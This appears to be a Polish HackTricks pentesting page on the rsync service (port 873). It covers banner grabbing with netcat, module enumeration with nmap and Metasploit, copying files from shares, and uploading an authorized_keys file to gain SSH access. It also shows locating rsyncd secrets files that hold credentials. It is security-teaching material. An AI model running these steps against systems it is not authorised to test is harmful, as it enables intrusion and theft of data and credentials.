# 873 - Pentesting Rsync

{{#include ../banners/hacktricks-training.md}}

## **Podstawowe informacje**

Z [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** to narzędzie do efektywnego [przesyłania](https://en.wikipedia.org/wiki/File_transfer) i [synchronizowania](https://en.wikipedia.org/wiki/File_synchronization) [plików](https://en.wikipedia.org/wiki/Computer_file) między komputerem a zewnętrznym dyskiem twardym oraz w sieci [komputerów](https://en.wikipedia.org/wiki/Computer) poprzez porównywanie [czasów modyfikacji](<https://en.wikipedia.org/wiki/Timestamping_(computing)>) i rozmiarów plików.[\[3\]](https://en.wikipedia.org/wiki/Rsync#_note-man_page-3) Jest powszechnie stosowany w systemach [operacyjnych](https://en.wikipedia.org/wiki/Operating_system) podobnych do [Unix](https://en.wikipedia.org/wiki/Unix-like). Algorytm rsync to rodzaj [kodowania delta](https://en.wikipedia.org/wiki/Delta_encoding) i jest używany do minimalizowania wykorzystania sieci. [Zlib](https://en.wikipedia.org/wiki/Zlib) może być używany do dodatkowej [kompresji danych](https://en.wikipedia.org/wiki/Data_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#_note-man_page-3) a [SSH](https://en.wikipedia.org/wiki/Secure_Shell) lub [stunnel](https://en.wikipedia.org/wiki/Stunnel) mogą być używane dla bezpieczeństwa.

**Domyślny port:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Enumeracja

### Baner i komunikacja ręczna
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Enumerowanie Wspólnych Folderów**

**Moduły Rsync** są rozpoznawane jako **udziały katalogów**, które mogą być **chronione hasłami**. Aby zidentyfikować dostępne moduły i sprawdzić, czy wymagają haseł, używane są następujące polecenia:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Bądź świadomy, że niektóre udostępnienia mogą nie pojawić się na liście, co może je ukrywać. Dodatkowo, dostęp do niektórych udostępnień może być ograniczony do określonych **credentials**, co jest wskazywane przez komunikat **"Access Denied"**.

### [**Brute Force**](../generic-hacking/brute-force.md#rsync)

### Ręczne użycie Rsync

Po uzyskaniu **module list**, działania zależą od tego, czy wymagana jest autoryzacja. Bez autoryzacji, **listing** i **copying** plików z udostępnionego folderu do lokalnego katalogu osiąga się poprzez:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Ten proces **rekursywnie przesyła pliki**, zachowując ich atrybuty i uprawnienia.

Z **danymi uwierzytelniającymi**, wylistowanie i pobranie z udostępnionego folderu można wykonać w następujący sposób, gdzie pojawi się monit o hasło:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Aby **przesłać zawartość**, taką jak plik _**authorized_keys**_ do uzyskania dostępu, użyj:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Aby zlokalizować plik konfiguracyjny rsyncd, wykonaj:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
W tym pliku parametr _secrets file_ może wskazywać na plik zawierający **nazwy użytkowników i hasła** do uwierzytelniania rsyncd.

## References

- [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{{#include ../banners/hacktricks-training.md}}
